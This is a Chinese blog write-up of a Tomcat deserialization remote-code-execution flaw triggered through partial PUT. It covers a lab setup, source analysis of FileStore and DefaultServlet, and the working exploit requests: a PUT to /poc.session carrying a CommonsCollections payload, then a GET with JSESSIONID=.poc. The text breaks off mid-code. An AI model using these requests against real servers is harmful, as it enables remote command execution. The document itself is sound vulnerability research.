        <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache Tomcat是一个流行的开源 Web 服务器和 Java Servlet 容器。</p><p>Apache Tomcat 应用程序在启用了servlet的写入功能（默认禁用）、使用Tomcat文件会话持久化、存储机制默认位置且包含可反序列化利用的依赖库时可以上传恶意序列化流，并触发反序列化进行进一步利用，可造成远程命令执行等危害。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 11.0.2</p><p>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 10.1.34</p><p>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 9.0.98</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>修改 tomcat 安装目录中 conf&#x2F;web.xml 文件，设置 readonly 为 false</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 启用写入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改 tomcat 安装目录中 conf&#x2F;context.xml 文件，启用 session 文件持久化</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 启用会话持久化 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后需要手动引入一个有反序列化漏洞的依赖，我这里选用了 common-collections:3.2.1</p><p><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1</a></p><p>下载 jar 包后放入 tomcat 安装目录下的 lib 目录即可。</p><p>然后启动 Tomcat 时使用 bin&#x2F;catalina.bat 的 jpda 启动</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./catalina.bat jpda <span class="built_in">start</span></span><br></pre></td></tr></table></figure><p>tomcat 默认调试的端口是 8000</p><p>配置调试，注意端口</p><p><img src="https://s2.loli.net/2025/03/25/y16g9Bn8teMZQP3.png" alt="img"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>写入恶意序列化流数据，注意这里的 Content-Range 数值，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/poc.session</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Content-Range</span><span class="punctuation">: </span>bytes 0-1909/1910</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="template-variable">&#123;&#123;<span class="name">file</span>(<span class="name">F:</span>\CTFtools\java-chains-1.4.0-all\JavaNativePayload_CommonsCollectionsK1_TemplatesImpl_BytecodeConvert_Exec.txt)&#125;&#125;</span></span></span><br></pre></td></tr></table></figure><p>然后加载 session 文件触发反序列化</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=.poc</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/03/25/2c4fDOeImaiLKbF.png" alt="img"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先看漏洞通告</p><p><a href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq</a></p><blockquote><p>If all of the following were true, a malicious user was able to perform remote code execution:</p><ul><li><p>writes enabled for the default servlet (disabled by default)</p></li><li><p>support for partial PUT (enabled by default)</p></li><li><p>application was using Tomcat’s file based session persistence with the default storage location</p></li><li><p>application included a library that may be leveraged in a deserialization attack</p></li></ul></blockquote><p>看到这几个条件可以分析出以下内容</p><ul><li>可以写入任意内容</li><li>和 session 文件持久化有关</li><li>和反序列化有关</li></ul><p>看完很容易联想到 PHP 中的 SESSION 反序列化。</p><p>通过控制 session 文件内容，写入恶意序列化流，在加载 session 文件内容时触发反序列化</p><p>那么有几个疑问点：</p><ul><li>session 文件存放在哪？</li><li>怎么处理 session 文件的，真的是普通序列化和反序列化吗</li><li>PUT 默认写入在 Web 目录，怎么写入到 session 文件存储的位置</li></ul><p>一个一个解决它</p><h2 id="session-文件存放在哪"><a href="#session-文件存放在哪" class="headerlink" title="session 文件存放在哪"></a>session 文件存放在哪</h2><p>漏洞通告也写的很明白，需要默认位置才能利用，尝试问 ai 可以得到结论</p><p><img src="https://s2.loli.net/2025/03/25/LlJaWIRNKBXbqhf.png" alt="img"></p><p>这里被他小迷惑了一手，测试发现文件名并非如此，而是 <code>&#123;JSESSIONID&#125;.session</code>，路径是没问题的</p><p>需要测试可以访问 &#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;SessionExample 来获取 session，然后关闭 tomcat 服务器，关闭时 tomcat 会自动调用 session 文件持久化，使 session 持久化保存</p><p><img src="https://s2.loli.net/2025/03/25/uqySkUfTjNh72cX.png" alt="img"></p><p><img src="https://s2.loli.net/2025/03/25/OHKmAQUvd2VyNMI.png" alt="img"></p><h2 id="怎么处理-session-文件的，真的是普通序列化和反序列化吗"><a href="#怎么处理-session-文件的，真的是普通序列化和反序列化吗" class="headerlink" title="怎么处理 session 文件的，真的是普通序列化和反序列化吗"></a>怎么处理 session 文件的，真的是普通序列化和反序列化吗</h2><p>可以用 010 打开得到的 session 文件，可以发现魔数为 0xAC 0xED 符合序列化流的特征，也进一步验证了猜想，但还需进一步调试源码验证</p><p>首先定位到这部分逻辑的代码，也可以咨询 ai</p><p><img src="https://s2.loli.net/2025/03/25/w9kjbFGNPVptmdi.png" alt="img"></p><p>根据类名就能猜到应该是<code>org.apache.catalina.session.FileStore</code>，定位相关代码</p><p>跟进<code>org.apache.catalina.session.FileStore#save</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(Session session)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.file(session.getIdInternal());</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.manager.getContext().getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.manager.getContext().getLogger().debug(sm.getString(<span class="built_in">this</span>.getStoreName() + <span class="string">&quot;.saving&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;session.getIdInternal(), file.getAbsolutePath()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file.getAbsolutePath());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(fos));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((StandardSession)session).writeObjectData(oos);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    oos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var8) &#123;</span><br><span class="line">                    var9.addSuppressed(var8);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> var9;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var10) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fos.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                var10.addSuppressed(var7);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> var10;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里将 session 序列化后存储到指定文件中。</p><p>跟进<code>org.apache.catalina.session.FileStore#file()</code> 可以找到 session 文件的命名规则，就是 sessionid 加上 <code>.session</code> 后缀</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> File <span class="title function_">file</span><span class="params">(String id)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">storageDir</span> <span class="operator">=</span> <span class="built_in">this</span>.directory();</span><br><span class="line">    <span class="keyword">if</span> (storageDir == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> id + <span class="string">&quot;.session&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(storageDir, filename);</span><br><span class="line">        <span class="type">File</span> <span class="variable">canonicalFile</span> <span class="operator">=</span> file.getCanonicalFile();</span><br><span class="line">        <span class="keyword">if</span> (!canonicalFile.toPath().startsWith(storageDir.getCanonicalFile().toPath())) &#123;</span><br><span class="line">            log.warn(sm.getString(<span class="string">&quot;fileStore.invalid&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;file.getPath(), id&#125;));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> canonicalFile;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>org.apache.catalina.session.FileStore#directory()</code>可以找到获取存储目录路径的逻辑</p><p><img src="https://s2.loli.net/2025/03/25/Jsj2ZlHWznc7otA.png" alt="img"></p><p>也就是从<code>javax.servlet.context.tempdir</code>中获取，这个值和上下文有关。</p><p>既然有持久化存储 session 的逻辑，继续找找加载 session 的逻辑</p><p>跟进<code>org.apache.catalina.session.FileStore#load</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Session <span class="title function_">load</span><span class="params">(String id)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.file(id);</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getManager().getContext();</span><br><span class="line">        <span class="type">Log</span> <span class="variable">contextLog</span> <span class="operator">=</span> context.getLogger();</span><br><span class="line">        <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">            contextLog.debug(sm.getString(<span class="built_in">this</span>.getStoreName() + <span class="string">&quot;.loading&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id, file.getAbsolutePath()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">oldThreadContextCL</span> <span class="operator">=</span> context.bind(Globals.IS_SECURITY_ENABLED, (ClassLoader)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Object ois;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file.getAbsolutePath());</span><br><span class="line"></span><br><span class="line">                StandardSession var9;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="built_in">this</span>.getObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">StandardSession</span> <span class="variable">session</span> <span class="operator">=</span> (StandardSession)<span class="built_in">this</span>.manager.createEmptySession();</span><br><span class="line">                        session.readObjectData(ois);</span><br><span class="line">                        session.setManager(<span class="built_in">this</span>.manager);</span><br><span class="line">                        var9 = session;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var19) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ois.close();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">                                var19.addSuppressed(var18);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">throw</span> var19;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                        ois.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var20) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        fis.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var17) &#123;</span><br><span class="line">                        var20.addSuppressed(var17);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> var20;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                fis.close();</span><br><span class="line">                <span class="keyword">return</span> var9;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (FileNotFoundException var21) &#123;</span><br><span class="line">                <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">                    contextLog.debug(<span class="string">&quot;No persisted data file found&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ois = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Session)ois;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易看出这里是在反序列化 session 文件中的序列化流，因此只要可控 session 文件的内容就可以反序列化可控的数据，当环境存在有漏洞的依赖时就可以实现利用</p><h2 id="PUT-默认写入在-Web-目录，怎么写入到-session-文件存储的位置"><a href="#PUT-默认写入在-Web-目录，怎么写入到-session-文件存储的位置" class="headerlink" title="PUT 默认写入在 Web 目录，怎么写入到 session 文件存储的位置"></a>PUT 默认写入在 Web 目录，怎么写入到 session 文件存储的位置</h2><p>这里就需要跟进 PUT 处理相关的代码了，可以参考 CVE-2024-50379 漏洞复现文章的相关资料</p><p>跟进<code>org.apache.catalina.servlets.DefaultServlet#doPut</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPut</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.readOnly) &#123;</span><br><span class="line">            <span class="built_in">this</span>.sendNotAllowed(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.getRelativePath(req);</span><br><span class="line">            <span class="type">WebResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">            <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="built_in">this</span>.parseContentRange(req, resp);</span><br><span class="line">            <span class="keyword">if</span> (range != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">resourceInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (range == IGNORE) &#123;</span><br><span class="line">                        resourceInputStream = req.getInputStream();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="built_in">this</span>.executePartialPut(req, range, path);</span><br><span class="line">                        resourceInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(contentFile);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.resources.write(path, resourceInputStream, <span class="literal">true</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (resource.exists()) &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">204</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">201</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        resp.sendError(<span class="number">409</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (resourceInputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            resourceInputStream.close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException var13) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以发现<code>this.parseContentRange()</code>这个函数，看看在干嘛</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Range <span class="title function_">parseContentRange</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">contentRangeHeader</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Content-Range&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (contentRangeHeader == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> IGNORE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.allowPartialPut) &#123;</span><br><span class="line">        response.sendError(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ContentRange</span> <span class="variable">contentRange</span> <span class="operator">=</span> ContentRange.parse(<span class="keyword">new</span> <span class="title class_">StringReader</span>(contentRangeHeader));</span><br><span class="line">        <span class="keyword">if</span> (contentRange == <span class="literal">null</span>) &#123;</span><br><span class="line">            response.sendError(<span class="number">400</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!contentRange.getUnits().equals(<span class="string">&quot;bytes&quot;</span>)) &#123;</span><br><span class="line">            response.sendError(<span class="number">400</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Range</span>();</span><br><span class="line">            range.start = contentRange.getStart();</span><br><span class="line">            range.end = contentRange.getEnd();</span><br><span class="line">            range.length = contentRange.getLength();</span><br><span class="line">            <span class="keyword">if</span> (!range.validate()) &#123;</span><br><span class="line">                response.sendError(<span class="number">400</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> range;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出这里接受了 Content-Range 请求头，这是什么？问问 ai</p><p><img src="https://s2.loli.net/2025/03/25/dOW5Kmly6MxYG7r.png" alt="img"></p><p>这就很有意思了，用于大文件分段传输的，那还没传输完的文件切片会缓存在哪呢，没错，还真就在 session 文件存放的地方</p><p>回到<code>org.apache.catalina.servlets.DefaultServlet#doPut</code>，在解析完 Content-Range 请求头后给了 range 这个变量，当<code>range != IGNORE</code>就会调用<code>org.apache.catalina.servlets.DefaultServlet#executePartialPut()</code>，该方法参数中也含有range 变量</p><p>跟进 <code>org.apache.catalina.servlets.DefaultServlet#executePartialPut()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> File <span class="title function_">executePartialPut</span><span class="params">(HttpServletRequest req, Range range, String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">tempDir</span> <span class="operator">=</span> (File)<span class="built_in">this</span>.getServletContext().getAttribute(<span class="string">&quot;javax.servlet.context.tempdir&quot;</span>);</span><br><span class="line">        <span 